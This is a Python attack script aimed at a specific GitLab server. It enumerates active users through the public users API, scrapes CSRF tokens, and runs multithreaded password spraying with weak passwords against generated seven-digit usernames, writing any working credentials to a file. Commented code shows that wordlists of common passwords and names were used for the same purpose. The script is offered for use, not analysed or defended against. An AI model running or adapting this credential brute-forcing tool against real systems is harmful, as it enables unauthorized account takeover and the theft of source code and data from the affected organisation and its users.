#!coding=utf-8

import json
import requests
from bs4 import BeautifulSoup
import urllib3
import time
import concurrent.futures

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

host = 'http://gitlab.odododododododod.com:18088/'
login_url = '/users/sign_in'
api_user = '/api/v4/users/'


def get_user():
    session = requests.Session()
    username_list = []

    for num in range(0, 1000):
        try:
            req = session.get(host + api_user + str(num), verify=False, timeout=15)
            if req.status_code == 200:
                json_data = json.loads(req.text)
                if json_data['state'] == 'active':
                    username = json_data['username']
                    print(num, username)
                    username_list.append(username)

        except:
            pass
    print(username_list)
    return username_list


def login(username, password):
    session = requests.Session()
    try:
        login_req = session.get(host + login_url, verify=False, timeout=15)

        csrf_token = ''
        login_sc = login_req.status_code
        if login_sc == 200:
            login_resp = login_req.text
            soup = BeautifulSoup(login_resp, 'html.parser')
            meta = soup.find_all('meta')
            for entry in meta:
                if 'name' in entry.attrs:
                    if entry.attrs['name'] == 'csrf-token':
                        csrf_token = entry.attrs['content']
        else:
            print('[-] Status : ' + str(login_req.status_code))
            time.sleep(5.1)

        login_data = {
            'utf8': '✓',
            'authenticity_token': csrf_token,
            'user[login]': username,
            'user[password]': password,
            'user[remember_me]': 0
        }
        print(login_data)
        time.sleep(0.5)
        login_req = session.post(host + login_url, data=login_data, allow_redirects=False)
        # print(login_req.text, login_req.status_code)
        if login_req.status_code == 302 and 'redirected' in login_req.text:
            print(username, password, file=open('gitlab_Successful.txt'))
            print(username, password)
            print('[+] Login Successful!')
            session.close()
            return 'Successful'
        elif login_req.status_code == 502:
            print('[-] Status : ' + str(login_req.status_code))
            time.sleep(5.1)
        else:
            print('[-] Status : ' + str(login_req.status_code))
            print('[-] Login Failed!')
            return 'Failed'
    except:
        pass

def try_logins(user_list, password_list, max_threads=10):
    with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
        futures = []
        for username in user_list:
            for password in password_list:
                futures.append(executor.submit(login, username, password))
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result == 'Successful':
                continue


if __name__ == '__main__':

    # username = ['nianliu', 'root', 'bb', 'gitlab_bot']
    # username = ['root', 'yanan.li', 'yang.liu', 'yi.ren', 'lengyue.huang']
    password = ['123456', '88888888']
    # password = []
    # with open('top-passwords.txt', 'r') as file:
    #     print('[+] 密码字典加载完成')
    #     for target in file.readlines():
    #         passwd = ''.join(target.split('\n'))
    #         password.append(passwd)
    
    user_list = []
    # with open('top3000-zhangwei.txt', 'r') as file:
    #     print('[+] 用户名字典加载完成')
    #     for target in file.readlines():
    #         username = ''.join(target.split('\n'))
    #         user_list.append(username)

    # 遍历从 0000545 到 0010545 之间的数字
    for i in range(545, 10546):
    # 使用字符串格式化保持 7 位数字，前面不足的补零
        username = f"{i:07d}"
        user_list.append(username)
    
    # 设置并发线程
    max_threads = 2
    try_logins(user_list, password, max_threads)
